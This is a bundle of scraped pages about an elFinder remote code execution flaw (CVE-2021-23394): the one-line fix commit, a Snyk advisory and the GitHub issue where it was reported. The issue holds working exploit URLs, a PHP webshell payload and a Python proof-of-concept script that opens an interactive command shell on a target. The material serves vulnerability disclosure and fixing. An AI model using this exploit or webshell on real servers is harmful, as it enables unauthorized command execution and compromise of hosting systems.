=== Content from github.com_e4e83602_20250114_231604.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStudio-42%2FelFinder%2Fcommit%2F75ea92decc16a5daf7f618f85dc621d1b534b5e1)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStudio-42%2FelFinder%2Fcommit%2F75ea92decc16a5daf7f618f85dc621d1b534b5e1)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=Studio-42%2FelFinder)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Studio-42](/Studio-42)
/
**[elFinder](/Studio-42/elFinder)**
Public

* [Notifications](/login?return_to=%2FStudio-42%2FelFinder) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2FStudio-42%2FelFinder)
* [Star
   4.7k](/login?return_to=%2FStudio-42%2FelFinder)

* [Code](/Studio-42/elFinder)
* [Issues
  4](/Studio-42/elFinder/issues)
* [Pull requests
  6](/Studio-42/elFinder/pulls)
* [Discussions](/Studio-42/elFinder/discussions)
* [Actions](/Studio-42/elFinder/actions)
* [Wiki](/Studio-42/elFinder/wiki)
* [Security](/Studio-42/elFinder/security)
* [Insights](/Studio-42/elFinder/pulse)

Additional navigation options

* [Code](/Studio-42/elFinder)
* [Issues](/Studio-42/elFinder/issues)
* [Pull requests](/Studio-42/elFinder/pulls)
* [Discussions](/Studio-42/elFinder/discussions)
* [Actions](/Studio-42/elFinder/actions)
* [Wiki](/Studio-42/elFinder/wiki)
* [Security](/Studio-42/elFinder/security)
* [Insights](/Studio-42/elFinder/pulse)

## Commit

[Permalink](/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[VD:abstract] add `'phar:*' => 'text/x-php'` into 'staticMineMap'

[Browse files](/Studio-42/elFinder/tree/75ea92decc16a5daf7f618f85dc621d1b534b5e1)
Browse the repository at this point in the history

```
rel. [#3295](https://github.com/Studio-42/elFinder/issues/3295)
```

* Loading branch information

[![@nao-pon](https://avatars.githubusercontent.com/u/1412630?s=40&v=4)](/nao-pon)

[nao-pon](/Studio-42/elFinder/commits?author=nao-pon "View all commits by nao-pon")
committed
May 31, 2021

1 parent
[6a97635](/Studio-42/elFinder/commit/6a97635e590b5882bf95f62f8e70e7230bbc625e)

commit 75ea92d

Showing
**1 changed file**
with
**1 addition**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

1 change: 1 addition & 0 deletions

1
[php/elFinderVolumeDriver.class.php](#diff-85602823cf2cdaf2502dc4f1b97001ffc0f083652aef175d9f068a5bfe90ca71 "php/elFinderVolumeDriver.class.php")

Show comments

[View file](/Studio-42/elFinder/blob/75ea92decc16a5daf7f618f85dc621d1b534b5e1/php/elFinderVolumeDriver.class.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -281,6 +281,7 @@ abstract class elFinderVolumeDriver |
|  |  | 'php5:\*' => 'text/x-php', |
|  |  | 'php7:\*' => 'text/x-php', |
|  |  | 'phtml:\*' => 'text/x-php', |
|  |  | 'phar:\*' => 'text/x-php', |
|  |  | 'cgi:\*' => 'text/x-httpd-cgi', |
|  |  | 'pl:\*' => 'text/x-perl', |
|  |  | 'asp:\*' => 'text/x-asap', |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `75ea92d`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStudio-42%2FelFinder%2Fcommit%2F75ea92decc16a5daf7f618f85dc621d1b534b5e1) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from snyk.io_e51ab206_20250114_231607.html ===
[![Homepage](/_nuxt/header-logo.Dk_X-iWD.svg)](/)

2. [Snyk Vulnerability Database](/vuln)
3. [Composer](/vuln/composer)
4. studio-42/elfinder
# Remote Code Execution (RCE) Affecting [studio-42/elfinder](/package/composer/studio-42/elfinder) package, versions **<2.1.58**

---

### Severity

 Recommended 0.0high010

CVSS assessment made by Snyk's Security Team. [Learn more](/vuln/SNYK-PHP-STUDIO42ELFINDER-1290554#cvss)

### Threat Intelligence

Exploit Maturity

Snyk has a proof-of-concept or detailed explanation of how to exploit this vulnerability.

Proof of conceptEPSS

The probability is the direct output of the EPSS model, and conveys an overall sense of the threat of
exploitation in the wild. The percentile measures the EPSS probability relative to all known EPSS scores.
Note: This data is updated daily, relying on the latest available EPSS model version.
Check out the EPSS
[documentation](https://www.first.org/epss/articles/prob_percentile_bins)
for more details.

**1.23% (86th percentile)**
### Do your applications use this vulnerable package?

In a few clicks we can analyze your entire application and see what components are vulnerable in your application, and suggest you quick fixes.

[Test your applications](https://app.snyk.io/login?cta=sign-up&loc=banner&page=vuln-vuln)

* Snyk ID**SNYK-PHP-STUDIO42ELFINDER-1290554**
* published**13 Jun 2021**
* disclosed**9 May 2021**
* credit**Ashok Chand**

[Report a new vulnerability](https://snyk.io/vulnerability-disclosure/) [Found a mistake?](https://support.snyk.io/s/contactsupport)
#### Introduced: 9 May 2021

[CVE-2021-23394  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2021-23394) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-94  (opens in a new tab)](https://cwe.mitre.org/data/definitions/94.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `studio-42/elfinder` to version 2.1.58 or higher.

## Overview

[studio-42/elfinder](https://github.com/Studio-42/elFinder) is an open-source file manager for web, written in JavaScript using jQuery UI.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) via execution of PHP code in a `.phar` file.
NOTE: This only applies if the server is configured to parse `.phar` files as PHP.

## References

* [GitHub Commit](https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1)
* [GitHub Issue](https://github.com/Studio-42/elFinder/issues/3295)
* [Sonarsource Writeup](https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities)
### CVSS Scores

version 3.1
### Snyk

8.1 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.

  **High**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**
### NVD

9.8 critical
### Product

* [Snyk Open Source](https://snyk.io/product/open-source-security-management/)
* [Snyk Code](https://snyk.io/product/snyk-code/)
* [Snyk Container](https://snyk.io/product/container-vulnerability-management/)
* [Snyk Infrastructure as Code](https://snyk.io/product/infrastructure-as-code-security/)
* [Snyk AppRisk](https://snyk.io/product/snyk-apprisk/)
### Resources

* [Vulnerability DB](https://security.snyk.io/)
* [Documentation](https://docs.snyk.io/)
* [Disclosed Vulnerabilities](/disclosed-vulnerabilities)
* [Blog](https://snyk.io/blog/)
* [FAQs](https://support.snyk.io/)
### Company

* [About](https://snyk.io/about)
* [Jobs](https://snyk.io/careers/)
* Contact
* [Policies](https://snyk.io/policies/terms-of-service/)
* [Do Not Sell My Personal Information](https://preferences.snyk.io/dont_sell)
### Contact Us

* Support
* [Report a new vuln](https://snyk.io/vulnerability-disclosure)
* [Events](https://snyk.io/events)
### Find us online

### Track our development

[![DevSecOps Community Podcast](data:image/svg+xml;base64...)](https://www.devseccon.com/the-secure-developer-podcast/)

© 2025 Snyk Limited

Registered in England and Wales. Company number: 09677925

Registered address: Highlands House, Basingstoke Road, Spencers Wood, Reading, Berkshire, RG7 1NT.



=== Content from github.com_42e8dab5_20250114_231604.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStudio-42%2FelFinder%2Fissues%2F3295)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStudio-42%2FelFinder%2Fissues%2F3295)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=Studio-42%2FelFinder)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Studio-42](/Studio-42)
/
**[elFinder](/Studio-42/elFinder)**
Public

* [Notifications](/login?return_to=%2FStudio-42%2FelFinder) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2FStudio-42%2FelFinder)
* [Star
   4.7k](/login?return_to=%2FStudio-42%2FelFinder)

* [Code](/Studio-42/elFinder)
* [Issues
  4](/Studio-42/elFinder/issues)
* [Pull requests
  6](/Studio-42/elFinder/pulls)
* [Discussions](/Studio-42/elFinder/discussions)
* [Actions](/Studio-42/elFinder/actions)
* [Wiki](/Studio-42/elFinder/wiki)
* [Security](/Studio-42/elFinder/security)
* [Insights](/Studio-42/elFinder/pulse)

Additional navigation options

* [Code](/Studio-42/elFinder)
* [Issues](/Studio-42/elFinder/issues)
* [Pull requests](/Studio-42/elFinder/pulls)
* [Discussions](/Studio-42/elFinder/discussions)
* [Actions](/Studio-42/elFinder/actions)
* [Wiki](/Studio-42/elFinder/wiki)
* [Security](/Studio-42/elFinder/security)
* [Insights](/Studio-42/elFinder/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FStudio-42%2FelFinder%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FStudio-42%2FelFinder%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Remote Code Execution in elFinder 2.1.57 #3295

Closed

[bng0](/bng0) opened this issue
May 8, 2021
· 9 comments

Closed

# [Remote Code Execution in elFinder 2.1.57](#top) #3295

[bng0](/bng0) opened this issue
May 8, 2021
· 9 comments

## Comments

[![@bng0](https://avatars.githubusercontent.com/u/32485988?s=80&v=4)](/bng0)

Copy link

### **[bng0](/bng0)** commented [May 8, 2021](#issue-881092180) • edited Loading

| 1. create a .phar file using the following URL:    <http://hostname/elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name=webshell.phar> 2. Add PHP code in the webshell.phar file by following GET request:    <http://hostname/elFinder/php/connector.minimal.php?cmd=put&target=><hash\_of\_the\_shell.phar\_file\_from\_step1\_response>&content=`<?=system($_GET[0]);?>` 3. Execute the OS command with the privilege of the webserver:    <http://hostname/elFinder/files/webshell.phar?0=id>   Tested on apache and nginx webservers. By default it works in apache webserver and it requires .phar file to be executed as php code in nginx  ``` Python POC:  import http.client, urllib.parse,sys,re from pwn import * import pwnlib.util.web  Author="Ashok Chand" print("Author: ",Author)  def main():     if len(sys.argv)==1:         print("Usage: python3 elfinder_2.1.57_exploit.py <ip>")         sys.exit(0)     host=sys.argv[1]     headers={"Host":host}     connect=http.client.HTTPConnection(host)     connect.request("GET","/elFinder/php/connector.minimal.php?cmd=mkfile&target=l1_Lw&name=webshell.phar")     response=connect.getresponse()     x=response.read()     file_hash=re.findall(b'l1_[A-Za-z0-9]{10,18}',x)     for h in file_hash:         hash_file=h.decode()     connect.request("GET","/elFinder/php/connector.minimal.php?cmd=put&content=<?='';system($_GET[0]);?>&target="+hash_file)     while True:         cmd=raw_input("cmd>")         print(cmd)         url=f"http://{host}/elFinder/files/webshell.phar?0={cmd.decode()}"         res=wget(url, timeout=20)         print(res.decode()) if __name__=="__main__":     main()   ``` |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@nao-pon](https://avatars.githubusercontent.com/u/1412630?s=80&v=4)](/nao-pon)

Copy link

Member

### **[nao-pon](/nao-pon)** commented [May 30, 2021](#issuecomment-851020250)

| [@bng0](https://github.com/bng0) The server administrator must properly set the file types that are allowed to be uploaded in elFinder. If you can use elFinder to install a prohibited file type on the server in some way, it is a vulnerability of elFinder. However, if the upload prohibition mechanism is working properly, it is a responsibility set by the server administrator. |
| --- |

 👍
1
 ammarfaizi2 reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@crackytsi](https://avatars.githubusercontent.com/u/11610825?s=80&v=4)](/crackytsi)

Copy link

### **[crackytsi](/crackytsi)** commented [May 31, 2021](#issuecomment-851260157)

| I think .phar extension should be included by default in staticMineMap at <https://github.com/Studio-42/elFinder/blob/master/php/elFinderVolumeDriver.class.php> |
| --- |

All reactions

Sorry, something went wrong.

[![@nao-pon](https://avatars.githubusercontent.com/u/1412630?s=80&v=4)](/nao-pon)

Copy link

Member

### **[nao-pon](/nao-pon)** commented [May 31, 2021](#issuecomment-851434927)

| [@crackytsi](https://github.com/crackytsi) Certainly, that is safer. I include phar in staticMineMap's x-php by default. Thanks! 👍 |
| --- |

 😄
1
 crackytsi reacted with laugh emoji
 🚀
1
 ammarfaizi2 reacted with rocket emoji

All reactions

* 😄
  1 reaction
* 🚀
  1 reaction

Sorry, something went wrong.

[nao-pon](/nao-pon)
added a commit
that referenced
this issue
[May 31, 2021](#ref-commit-75ea92d)
[![@nao-pon](https://avatars.githubusercontent.com/u/1412630?s=40&v=4)](/nao-pon)

`[[VD:abstract] add 'phar:*' => 'text/x-php' into 'staticMineMap'](/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1 "[VD:abstract] add `'phar:*' => 'text/x-php'` into 'staticMineMap'

rel. #3295")`
…

`[75ea92d](/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1)`

```
rel. [#3295](https://github.com/Studio-42/elFinder/issues/3295)
```

[![@bng0](https://avatars.githubusercontent.com/u/32485988?s=80&v=4)](/bng0)

Copy link

Author

### **[bng0](/bng0)** commented [Jun 2, 2021](#issuecomment-852784637)

| So, is this a valid bug? |
| --- |

All reactions

Sorry, something went wrong.

[![@nao-pon](https://avatars.githubusercontent.com/u/1412630?s=80&v=4)](/nao-pon)

Copy link

Member

### **[nao-pon](/nao-pon)** commented [Jun 2, 2021](#issuecomment-852807040)

| [@bng0](https://github.com/bng0) What you have reported is not a bug in elFinder.  For example, if you have a setting that allows untrusted users to upload PHP files with elFinder to a directory where PHP can be executed, it is probably a misconfiguration of the elFinder installer.  On the other hand, if the elFinder installer has set the appropriate settings, but there is a security hole that bypasses the settings, we consider it a bug in elFinder and need to take immediate action.  If you discover such elFinder bugs in the future, please notify to the maintainers of this repository by email. |
| --- |

 ❤️
1
 ammarfaizi2 reacted with heart emoji

All reactions

* ❤️
  1 reaction

Sorry, something went wrong.

[![@bng0](https://avatars.githubusercontent.com/u/32485988?s=80&v=4)](/bng0)

Copy link

Author

### **[bng0](/bng0)** commented [Jun 2, 2021](#issuecomment-852847833)

| ok sure, thanks. |
| --- |

All reactions

Sorry, something went wrong.

[![@bng0](https://avatars.githubusercontent.com/u/32485988?s=80&v=4)](/bng0)

Copy link

Author

### **[bng0](/bng0)** commented [Jun 2, 2021](#issuecomment-852853027)

| Bye the way, directly neither .php file was allowed to upload nor any content containing `php` string was allowed to write to the upload files. So i used `<?=` which is a bypass to the restriction. Since .phar was the only file that could be executed as the PHP file. So combining these two, shell was uploaded. Also, any allowed file types can be renamed later to the .phar file but renaming to .php was also not allowed. Isn't this a bypass or bug? |
| --- |

All reactions

Sorry, something went wrong.

[![@nao-pon](https://avatars.githubusercontent.com/u/1412630?s=80&v=4)](/nao-pon)

Copy link

Member

### **[nao-pon](/nao-pon)** commented [Jun 2, 2021](#issuecomment-853042139)

| [@bng0](https://github.com/bng0) ah I see. It seems that file type detection by phpinfo does not support short tags.   1. elFinder prohibits uploading x-php MIME-Type 2. ".phar" can be executed in a directory that can be uploaded by elFinder 3. Short tags are enabled in PHP settings   In the above case, it certainly creates a vulnerable state. In such cases, the `'phar: *'=>' text / x-php'` added to the'staticMineMap' will be enabled, but some servers may be able to run PHP in .html. In that case, you need to set .html as x-php.  However, it is difficult to handle these various cases by default, so it is necessary for the person who installs elFinder to understand the specifications of the server and set it appropriately.  `'additionalMimeMap' => array ('html: *'=>' text / x-php',),`  For me personally, I think it's safe to set the directories that can be uploaded by elFinder so that no file type can be made executable. |
| --- |

All reactions

Sorry, something went wrong.

[![@bng0](https://avatars.githubusercontent.com/u/32485988?s=80&v=4)](/bng0)

Copy link

Author

### **[bng0](/bng0)** commented [Jun 2, 2021](#issuecomment-853076507)

| Adding .phar in StaticMineMap array fixed the issue. Thanks and cheers . |
| --- |

 👍
1
 nao-pon reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@nao-pon](https://avatars.githubusercontent.com/u/1412630?s=40&v=4)](/nao-pon)
[nao-pon](/nao-pon)
closed this as [completed](/Studio-42/elFinder/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jun 8, 2021](#event-4857767364)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FStudio-42%2FelFinder%2Fissues%2F3295)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

3 participants

[![@nao-pon](https://avatars.githubusercontent.com/u/1412630?s=52&v=4)](/nao-pon) [![@crackytsi](https://avatars.githubusercontent.com/u/11610825?s=52&v=4)](/crackytsi) [![@bng0](https://avatars.githubusercontent.com/u/32485988?s=52&v=4)](/bng0)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_69ab9eb2_20250114_231602.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStudio-42%2FelFinder)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStudio-42%2FelFinder)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Studio-42%2FelFinder)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Studio-42](/Studio-42)
/
**[elFinder](/Studio-42/elFinder)**
Public

* [Notifications](/login?return_to=%2FStudio-42%2FelFinder) You must be signed in to change notification settings
* [Fork
  1.4k](/login?return_to=%2FStudio-42%2FelFinder)
* [Star
   4.7k](/login?return_to=%2FStudio-42%2FelFinder)

📁 Open-source file manager for web, written in JavaScript using jQuery and jQuery UI

[studio-42.github.io/elFinder/](https://studio-42.github.io/elFinder/ "https://studio-42.github.io/elFinder/")

### License

[View license](/Studio-42/elFinder/blob/master/LICENSE.md)

